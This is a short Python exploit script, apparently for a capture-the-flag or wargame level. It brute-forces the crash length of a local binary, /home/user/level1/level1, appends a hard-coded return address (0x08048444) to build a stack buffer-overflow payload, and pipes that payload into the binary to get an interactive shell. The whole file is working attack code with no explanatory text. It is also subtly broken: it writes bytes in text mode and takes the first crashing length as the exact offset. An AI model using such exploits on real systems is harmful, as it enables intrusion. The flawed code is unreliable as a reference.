import subprocess
import struct


def craft_payload(target_address, buffer_size, exploit_file):
	payload = b'A' * buffer_size
	payload += struct.pack('<I', target_address)
	with open(exploit_file, "w") as file1:
		file1.write(payload)


def execute_command(command):
	try:
		# Execute the command
		process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		return_code = process.wait()
		output, error = process.communicate()
		output = output.decode('utf-8')
		error = error.decode('utf-8')
		if len(output) or len(error):
			print("Output:\n" + output)
			print("Error:\n" + error)
		return return_code
	except Exception as e:
		print("Error executing command:", e)
		return None


command = "/home/user/level1/level1 < /tmp/output.txt"
output_string = ""
exploit_file = "/tmp/payload_level1"
offset = 0
while True:
	output_string += "A"
	with open("/tmp/output.txt", "w") as file2:
		file2.write(output_string)
	return_code = execute_command(command)
	if return_code in [139, 132]:
		offset = len(output_string)
		print("the overflow happens when the buffer is {} bytes long".format(offset))
		break
print("crafting payload and running exploit...")
craft_payload(0x08048444, offset, exploit_file)
execute_command("cat - | /home/user/level1/level1 < " + exploit_file)
